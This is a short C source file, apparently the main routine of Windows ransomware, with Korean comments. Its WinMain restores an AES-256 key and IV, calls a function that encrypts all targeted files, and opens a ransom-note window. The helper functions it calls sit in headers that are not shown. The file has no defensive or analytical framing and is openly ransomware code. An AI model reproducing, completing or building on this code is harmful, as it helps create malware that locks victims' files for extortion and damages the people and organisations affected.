#include <windows.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    restore_key(aes_key);                   // 키 복원
    restore_iv(iv);                         // IV 복원
    encrypt_all_targets(aes_key, iv);       // 전체 파일 암호화
    create_ransom_note();                   // 랜섬노트 GUI

    return 0;
}
